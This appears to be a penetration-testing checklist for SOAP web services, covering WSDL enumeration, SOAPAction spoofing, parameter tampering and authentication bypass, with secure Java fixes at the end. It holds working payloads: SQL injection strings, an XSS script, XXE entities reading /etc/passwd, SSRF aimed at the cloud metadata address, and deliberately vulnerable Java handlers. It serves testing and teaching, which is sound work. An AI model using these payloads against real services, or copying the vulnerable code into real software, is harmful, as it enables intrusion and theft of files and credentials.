
tactic: Multiple

**SOAP** is an XML-based protocol used for communication between clients and web services. Because it's XML, it inherits all XML vulnerabilities (XXE, injection) on top of its own issues like parameter tampering, authentication bypass, and action spoofing. SOAP services are often older, less maintained, and misconfigured.


```xml
Client sends XML envelope → SOAP endpoint → Server processes → returns XML response
 
#A SOAP message structure:

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Header>
        <!-- Auth tokens, session info -->
    </soap:Header>
    <soap:Body>
        <!-- The actual request/action -->
        <GetUser>
            <username>wiener</username>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```

Key concepts:

|Term|What it means|
|---|---|
|Envelope|Root element wrapping every SOAP message|
|Header|Optional — carries auth, session, metadata|
|Body|The actual request or response payload|
|Fault|Error response from the server|
|WSDL|Web Services Description Language — the API docs for a SOAP service|
|Action|The operation being invoked (`SOAPAction` header)|

---

## Recon & Discovery

```
/?wsdl                     → Full service description — lists all operations and parameters
/?WSDL
/service.asmx?wsdl
/api/soap?wsdl
/ws/service?wsdl
```

**From WSDL you get:**

- All available operations (methods)
- Parameter names and types
- Endpoint URLs
- Data types and schemas

Always read the WSDL completely — it often reveals admin or internal operations not intended for public use.

---

## Injection Points

- XML parameter values inside `<soap:Body>`
- `SOAPAction` header — controls which operation is invoked
- `<soap:Header>` — auth tokens, session identifiers
- WSDL file itself (if user-controllable)
- XML namespaces and schema locations (XXE vector)
- Any string parameter (SQLi, XSS, command injection)

---

## Checklist

### WSDL Enumeration

- [ ]  Fetch the WSDL and map all operations:

```
	GET /?wsdl
```

- [ ]  Look for operations like `AdminGetAllUsers`, `DeleteUser`, `GetPassword` try them unauthenticated
- [ ]  Note all parameter names these are your injection targets

### SOAPAction Spoofing

- [ ]  Change the `SOAPAction` header to a different operation while keeping the same body:

http

```http
	SOAPAction: "AdminOperation"
```

- [ ]  Try empty or wildcard SOAPAction  some services ignore it and use body content only:

http

```http
	SOAPAction: ""
	SOAPAction: "*"
```

### Parameter Tampering

- [ ]  Inject SQLi into string parameters:

xml

```xml
	<username>admin' OR '1'='1</username>
```

- [ ]  Inject XSS into parameters that get reflected in responses:

xml

```xml
	<name><![CDATA[<script>alert(1)</script>]]></name>
```

- [ ]  Try injecting extra XML elements to alter logic:

xml

```xml
	<GetUser>
	    <username>wiener</username>
	    <role>admin</role>   <!-- ← injected extra param -->
	</GetUser>
```

### XXE via SOAP Body

- [ ]  Inject XXE payload inside the envelope:

xml

```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	    <soap:Body>
	        <GetUser>
	            <username>&xxe;</username>
	        </GetUser>
	    </soap:Body>
	</soap:Envelope>
```

- [ ]  Try SSRF via XXE:

```xml
	<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

### Authentication Bypass

- [ ]  Remove the `<soap:Header>` auth token entirely — does the service still respond?
- [ ]  Send an empty or null auth token
- [ ]  Try replaying a captured auth header from a previous request

### WSDL Parameter Type Confusion

- [ ]  Send wrong data types for parameters — watch for verbose error messages leaking stack traces, DB info, internal paths

---

## Attack Payloads

**Basic SOAP request:**

```xml
POST /soap/endpoint HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "GetUser"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetUser>
            <username>wiener</username>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```

**SQLi in SOAP parameter:**

```xml
<GetUser>
    <username>admin' OR '1'='1' --</username>
</GetUser>
```

**XXE reading local file:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetUser>
            <username>&xxe;</username>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```

**SOAPAction spoofing:**

```http
POST /soap/endpoint HTTP/1.1
SOAPAction: "DeleteUser"    ← changed to admin operation
Content-Type: text/xml

<soap:Envelope>
    <soap:Body>
        <GetUser><username>wiener</username></GetUser>
    </soap:Body>
</soap:Envelope>
```

---

## White Box Testing

**Vulnerable — XML parser allows XXE:**

```java
@PostMapping(value = "/soap/endpoint", consumes = "text/xml")
public ResponseEntity<String> handleSoap(@RequestBody String soapMessage) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // ← XXE not disabled
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(new InputSource(new StringReader(soapMessage)));

    String username = doc.getElementsByTagName("username").item(0).getTextContent();
    // ← username could be the content of /etc/passwd if XXE succeeded
    return ResponseEntity.ok(userService.getUser(username));
}
```

**Vulnerable — SOAPAction not validated, any action executes:**

```java
@PostMapping("/soap/endpoint")
public ResponseEntity<?> soapEndpoint(
        @RequestHeader(value = "SOAPAction", required = false) String action,
        @RequestBody String body) {

    // ← SOAPAction header is logged but never validated against allowed operations
    log.info("SOAPAction: " + action);
    return processBody(body); // ← processes whatever is in body regardless of action
}
```

**Vulnerable — SQLi via string param passed directly to query:**

```java
@WebService
public class UserService {
    public User getUser(String username) {
        // ← username concatenated directly into SQL query
        String query = "SELECT * FROM users WHERE username = '" + username + "'";
        return jdbcTemplate.queryForObject(query, User.class);
    }
}
```

**Secure:**

```java
// Disable XXE in XML parser
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

// Validate SOAPAction against a whitelist
private static final Set<String> ALLOWED_ACTIONS = Set.of("GetUser", "UpdateUser");

if (!ALLOWED_ACTIONS.contains(action)) {
    return ResponseEntity.status(403).body("Forbidden action");
}

// Use parameterised queries — never concatenate user input into SQL
public User getUser(String username) {
    return jdbcTemplate.queryForObject(
        "SELECT * FROM users WHERE username = ?",
        new Object[]{username},
        User.class
    );
}
```

---

## Resources

- [HackTricks SOAP]([https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/soap](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html#soap---xee))
- [OWASP Web Services Security](https://owasp.org/www-project-web-services-security/)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)